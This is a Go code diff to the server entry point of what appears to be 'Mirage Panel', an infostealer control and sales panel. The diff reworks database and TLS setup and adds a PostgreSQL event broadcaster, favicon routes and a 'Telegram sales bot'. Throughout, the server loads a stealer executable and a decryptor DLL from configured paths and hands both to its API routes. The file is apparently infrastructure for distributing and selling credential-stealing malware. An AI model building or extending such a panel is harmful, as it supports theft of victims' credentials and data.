@@ -27,6 +27,8 @@ import (
 	"zialfi-panel/internal/api"
 	"zialfi-panel/internal/db"
 	mw "zialfi-panel/internal/middleware"
+	"zialfi-panel/internal/services"
+	"zialfi-panel/internal/services/bot"
 	"zialfi-panel/internal/ws"
 )
 
@@ -109,64 +111,66 @@ func generateSelfSignedCert(certDir string) (string, string, error) {
 
 func main() {
 	port := getEnv("PORT", "8080")
-	dbPath := getEnv("DB_PATH", "data/mirage.db")
-	databaseURL := getEnv("DATABASE_URL", "")
-	dbProvider := getEnv("DB_PROVIDER", "sqlite")
+	databaseURL := os.Getenv("DATABASE_URL")
+	if databaseURL == "" {
+		slog.Error("DATABASE_URL is required")
+		os.Exit(1)
+	}
+	if os.Getenv("DB_PROVIDER") != "" || os.Getenv("DB_PATH") != "" {
+		slog.Error("DB_PROVIDER and DB_PATH are unsupported; use DATABASE_URL")
+		os.Exit(1)
+	}
+	appEnv := getEnv("APP_ENV", "development")
 	jwtSecret := getEnv("JWT_SECRET", "")
+	if appEnv == "production" && jwtSecret == "" {
+		slog.Error("JWT_SECRET is required in production")
+		os.Exit(1)
+	}
 	allowedOrigins := getEnv("ALLOWED_ORIGINS", "http://localhost:5173")
 
 	tlsEnabled, _ := strconv.ParseBool(os.Getenv("TLS_ENABLED"))
 	tlsSelfSigned, _ := strconv.ParseBool(os.Getenv("TLS_SELF_SIGNED"))
+	tlsCertFile := getEnv("TLS_CERT_FILE", filepath.Join("data", "certs", "cert.pem"))
+	tlsKeyFile := getEnv("TLS_KEY_FILE", filepath.Join("data", "certs", "key.pem"))
+	if appEnv == "production" && (!tlsEnabled || tlsSelfSigned) {
+		slog.Error("production requires TLS_ENABLED=true and TLS_SELF_SIGNED=false")
+		os.Exit(1)
+	}
 
 	if jwtSecret == "" {
-		secretFile := filepath.Join(filepath.Dir(dbPath), ".jwt_secret")
+		secretFile := filepath.Join("data", ".jwt_secret")
 		if data, err := os.ReadFile(secretFile); err == nil {
 			jwtSecret = strings.TrimSpace(string(data))
 		} else {
 			jwtSecret = generateSecret()
-			if err := os.WriteFile(secretFile, []byte(jwtSecret), 0600); err != nil {
-				slog.Warn("failed to persist JWT secret, tokens will be invalid after restart", "err", err)
+			slog.Warn("generated local JWT secret; configure JWT_SECRET for restart-stable sessions")
+			if err := os.MkdirAll(filepath.Dir(secretFile), 0755); err == nil {
+				_ = os.WriteFile(secretFile, []byte(jwtSecret), 0600)
 			}
 		}
 	}
 
-	slog.Info("starting Mirage Panel",
-		"port", port,
-		"db", dbPath,
-		"provider", dbProvider,
-		"tls", tlsEnabled,
-		"allowed_origins", allowedOrigins,
-	)
+	slog.Info("starting Mirage Panel", "port", port, "database", "postgresql", "tls", tlsEnabled, "allowed_origins", allowedOrigins)
 
-	providerType := db.ProviderSQLite
-	switch strings.ToLower(dbProvider) {
-	case "postgres", "postgresql":
-		providerType = db.ProviderPostgres
-	}
-
-	connString := dbPath
-	if providerType == db.ProviderPostgres {
-		if databaseURL != "" {
-			connString = databaseURL
-		}
-	} else {
-		if err := os.MkdirAll(filepath.Dir(connString), 0755); err != nil {
-			slog.Error("failed to create data directory", "err", err)
-			os.Exit(1)
-		}
-	}
-
-	p := db.NewProvider(providerType, connString)
-	sqlDB, err := p.Open()
+	sqlDB, err := db.OpenPostgres(databaseURL)
 	if err != nil {
 		slog.Error("failed to open database", "err", err)
 		os.Exit(1)
 	}
 	defer sqlDB.Close()
 
-	if err := db.RunMigrationsWithProvider(sqlDB, db.MigrationsFS, providerType); err != nil {
+	if err := db.RunMigrations(sqlDB, db.MigrationsFS); err != nil {
 		slog.Error("failed to run migrations", "err", err)
 		os.Exit(1)
+	}
+
+	if err := db.VerifySchema(sqlDB, db.MigrationsFS); err != nil {
+		slog.Error("schema verification failed — refusing to start", "err", err)
+		os.Exit(1)
+	}
+
+	if set, err := db.IsDefaultAdminPassword(sqlDB); err == nil && set {
+		slog.Warn("default admin password is still the migration placeholder — run 'go run cmd/hashpw/main.go <password>' and UPDATE users SET password_hash = '<hash>' WHERE id = 'u_admin'")
 	}
 
 	r := chi.NewRouter()
@@ -181,7 +185,7 @@ func main() {
 
 	r.Use(mw.CORS(allowedOrigins))
 	r.Use(mw.CSRFProtect)
-	r.Use(mw.RateLimit(100, time.Minute))
+	r.Use(mw.RateLimit(500, time.Minute))
 	r.Use(mw.BanCheck(sqlDB))
 
 	r.Get("/health", func(w http.ResponseWriter, r *http.Request) {
@@ -200,6 +204,30 @@ func main() {
 	wsHub := ws.NewHub()
 	go wsHub.Run()
 
+	// PostgreSQL LISTEN/NOTIFY fans session events across panel workers.
+	pgCtx, pgCancel := context.WithCancel(context.Background())
+	defer pgCancel()
+	notifier, err := services.NewPGNotifier(pgCtx, databaseURL, wsHub)
+	if err != nil {
+		slog.Error("failed to create PG notifier", "err", err)
+		os.Exit(1)
+	}
+	broadcaster := services.Broadcaster(notifier)
+	go func() {
+		if err := notifier.Listen(pgCtx); err != nil {
+			slog.Error("pg listener stopped", "err", err)
+		}
+	}()
+	defer func() {
+		if err := notifier.Close(context.Background()); err != nil {
+			slog.Warn("failed to close PG notifier", "err", err)
+		}
+	}()
+	slog.Info("postgres LISTEN/NOTIFY broadcaster enabled")
+
+	// Start Telegram sales bot
+	tgBot := bot.New(sqlDB)
+	go tgBot.Start()
 	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret, allowedOrigins))
 
 	stealerPath := getEnv("STEALER_EXE_PATH", "")
@@ -226,8 +254,7 @@ func main() {
 		slog.Info("loaded decryptor DLL", "path", decryptorPath, "size", len(decryptorDll))
 	}
 
-	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll)
-
+	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll, broadcaster)
 	distFS, err := fs.Sub(frontendFS, "frontend/dist")
 	if err != nil {
 		slog.Error("failed to resolve frontend filesystem", "err", err)
@@ -235,6 +262,26 @@ func main() {
 	}
 
 	r.Handle("/assets/*", http.FileServer(http.FS(distFS)))
+
+	// Serve favicon and other root-level static files
+	for _, name := range []string{"favicon.png", "favicon-16x16.png", "favicon-32x32.png", "favicon.svg", "favicon_full.png", "favicon-full.png", "apple-touch-icon.png", "android-chrome-192x192.png", "android-chrome-512x512.png", "site.webmanifest", "icons.svg"} {
+		localName := name // capture for closure
+		r.Get("/"+localName, func(w http.ResponseWriter, r *http.Request) {
+			data, err := fs.ReadFile(distFS, localName)
+			if err != nil {
+				http.NotFound(w, r)
+				return
+			}
+			if strings.HasSuffix(localName, ".png") {
+				w.Header().Set("Content-Type", "image/png")
+			} else if strings.HasSuffix(localName, ".svg") {
+				w.Header().Set("Content-Type", "image/svg+xml")
+			} else if strings.HasSuffix(localName, ".webmanifest") {
+				w.Header().Set("Content-Type", "application/manifest+json")
+			}
+			w.Write(data)
+		})
+	}
 
 	r.Get("/public/*", func(w http.ResponseWriter, r *http.Request) {
 		index, err := fs.ReadFile(distFS, "index.html")
@@ -269,23 +316,25 @@ func main() {
 
 	go func() {
 		addr := srv.Addr
+		certFile, keyFile, tlsDesc := tlsCertFile, tlsKeyFile, "custom"
 		if tlsEnabled {
 			scheme := "https"
-			certDir := filepath.Join(filepath.Dir(connString), "certs")
-			var certFile, keyFile string
-			var tlsDesc string
 			if tlsSelfSigned {
-				certFile, keyFile, err = generateSelfSignedCert(certDir)
+				certFile, keyFile, err = generateSelfSignedCert(filepath.Dir(tlsCertFile))
 				if err != nil {
 					slog.Error("failed to generate self-signed cert", "err", err)
 					os.Exit(1)
 				}
 				tlsDesc = "self-signed"
 			} else {
-				certFile = filepath.Join(certDir, "cert.pem")
-				keyFile = filepath.Join(certDir, "key.pem")
-				if _, err := os.Stat(certFile); os.IsNotExist(err) {
-					slog.Error("TLS enabled but cert.pem not found and TLS_SELF_SIGNED is false", "cert", certFile)
+				certFile = tlsCertFile
+				keyFile = tlsKeyFile
+				if _, err := os.Stat(certFile); err != nil {
+					slog.Error("TLS certificate not found", "path", certFile)
+					os.Exit(1)
+				}
+				if _, err := os.Stat(keyFile); err != nil {
+					slog.Error("TLS key not found", "path", keyFile)
 					os.Exit(1)
 				}
 				tlsDesc = "custom"
